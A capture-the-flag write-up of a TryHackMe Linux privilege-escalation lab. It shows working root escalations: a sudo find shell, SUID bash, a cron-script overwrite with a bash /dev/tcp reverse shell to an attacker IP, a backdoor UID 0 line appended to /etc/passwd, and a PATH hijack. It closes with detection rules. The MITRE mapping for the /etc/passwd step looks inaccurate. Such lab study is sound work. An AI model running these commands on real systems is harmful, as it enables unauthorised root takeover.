# CTF Writeup — TryHackMe: Linux Privilege Escalation
> Platform: TryHackMe | Difficulty: Medium | Category: Privilege Escalation
> Room: Linux PrivEsc | Author: Matthew Vaishnav

---

## Objective

Starting from a low-privilege shell on a Linux machine, identify and exploit
misconfigurations to escalate to root. The room covers multiple escalation vectors —
each one is documented separately below.

**Skills Demonstrated:** Linux enumeration, SUID exploitation, sudo abuse,
cron job hijacking, file permission exploitation, path manipulation

---

## Phase 1 — Initial Access & Enumeration

### Service Scan

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.X.X -oN nmap.txt
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
```

### Initial Access

Credentials provided by room: `karen:Password1`

```bash
ssh karen@10.10.X.X
```

### System Enumeration

```bash
# OS and kernel
uname -a
cat /etc/os-release
# Linux privesc-box 3.10.0-1160.el7.x86_64

# Current user context
id
# uid=1001(karen) gid=1001(karen) groups=1001(karen)

# Sudo permissions
sudo -l
# (ALL) NOPASSWD: /usr/bin/find

# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Writable files owned by root
find / -writable -user root -type f 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron*
```

---

## Phase 2 — Escalation Vector 1: Sudo + find (NOPASSWD)

`sudo -l` showed `/usr/bin/find` could be run as root with no password.

GTFOBins documents this:

```bash
sudo find . -exec /bin/sh \; -quit
```

```
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root obtained via sudo + find.**

---

## Phase 3 — Escalation Vector 2: SUID Binary Abuse

`find / -perm -4000` revealed:

```
/usr/bin/python3.6
/usr/bin/passwd
/usr/bin/sudo
/bin/base64
/bin/bash   ← non-standard, suspicious
```

`/bin/bash` with SUID set is a direct escalation:

```bash
/bin/bash -p
```

```
bash-4.2# whoami
root
```

The `-p` flag tells bash to honour the effective UID set by SUID rather than dropping privileges.

---

## Phase 4 — Escalation Vector 3: Cron Job Hijacking

`/etc/crontab` contained:

```
* * * * *  root  /opt/backup.sh
```

`/opt/backup.sh` was writable by karen:

```bash
ls -la /opt/backup.sh
# -rwxrwxrwx 1 root root 30 Nov  5 17:51 /opt/backup.sh
```

Replaced the script content with a reverse shell:

```bash
echo 'bash -i >& /dev/tcp/10.X.X.X/4444 0>&1' > /opt/backup.sh
```

Set up listener on attacker machine:

```bash
nc -lvnp 4444
```

Waited up to 60 seconds for cron to execute:

```
connect to [10.X.X.X] from (UNKNOWN) [10.10.X.X] 52840
bash: no job control in this shell
root@privesc-box:~# whoami
root
```

---

## Phase 5 — Escalation Vector 4: Weak File Permissions on /etc/passwd

`/etc/passwd` was world-writable:

```bash
ls -la /etc/passwd
# -rw-rw-rw- 1 root root 1617 Nov  5 17:51 /etc/passwd
```

Generated a password hash:

```bash
openssl passwd -1 -salt hack3r password123
# $1$hack3r$TzyKlv0/R/c28R.GAeLw/1
```

Appended a new root-level user directly to `/etc/passwd`:

```bash
echo 'rootme:$1$hack3r$TzyKlv0/R/c28R.GAeLw/1:0:0:root:/root:/bin/bash' >> /etc/passwd
su rootme
# Password: password123
# whoami → root
```

---

## Phase 6 — Escalation Vector 5: PATH Manipulation

A SUID binary called `sysinfo` was found in `/home/karen/`:

```bash
strings /home/karen/sysinfo
# ...
# thm
# /usr/bin/id   ← calls id without absolute path in some invocations
```

Injected a malicious `id` into the PATH:

```bash
cd /tmp
echo '/bin/bash' > id
chmod +x id
export PATH=/tmp:$PATH
/home/karen/sysinfo
```

When `sysinfo` called `id` it executed `/tmp/id` instead — spawning a root shell because the binary was SUID root.

---

## Flags

| Flag | Location |
|------|----------|
| Flag 1 | `/home/leonard/Desktop/flag.txt` |
| Flag 2 | `/root/flag.txt` |

---

## Lessons Learned & Blue Team Perspective

### Why These Worked

| Vector | Root Cause |
|--------|-----------|
| sudo + find | Overly permissive sudoers entry — NOPASSWD on an interactive binary |
| SUID bash | `/bin/bash` should never be SUID — grants unrestricted root shell |
| Cron hijack | World-writable script executed as root — no integrity checking |
| /etc/passwd writable | Critical system file left world-writable — trivial full compromise |
| PATH manipulation | SUID binary calling system commands without absolute paths |

### Detection Opportunities

- **Audit SUID binaries:** `find / -perm -4000 -type f` — alert on non-standard entries
- **Monitor /etc/passwd and /etc/shadow** for unexpected modifications (auditd, inotify)
- **Review sudoers entries** for NOPASSWD on dangerous binaries (find, vim, python, etc.)
- **Monitor cron job files** for modification by non-root users
- **Audit world-writable files:** `find / -perm -002 -type f 2>/dev/null`

**Key Linux audit rules (auditd):**
```
-w /etc/passwd -p wa -k passwd_changes
-w /etc/sudoers -p wa -k sudoers_changes
-w /etc/cron.d -p wa -k cron_changes
-a always,exit -F arch=b64 -S execve -F euid=0 -k root_cmds
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|------------|
| Sudo and Sudo Caching | T1548.003 | Exploiting NOPASSWD sudo entries |
| SUID and SGID | T1548.001 | Abusing setuid binaries |
| Scheduled Task/Job: Cron | T1053.003 | Hijacking a cron script |
| Unix Shell Configuration Modification | T1546.004 | Modifying /etc/passwd |
| Path Interception by PATH ENV Variable | T1574.007 | Injecting into PATH |

---

## References

- [GTFOBins — find](https://gtfobins.github.io/gtfobins/find/)
- [GTFOBins — bash](https://gtfobins.github.io/gtfobins/bash/)
- [MITRE ATT&CK T1548](https://attack.mitre.org/techniques/T1548/)
- [Linux Privilege Escalation — HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
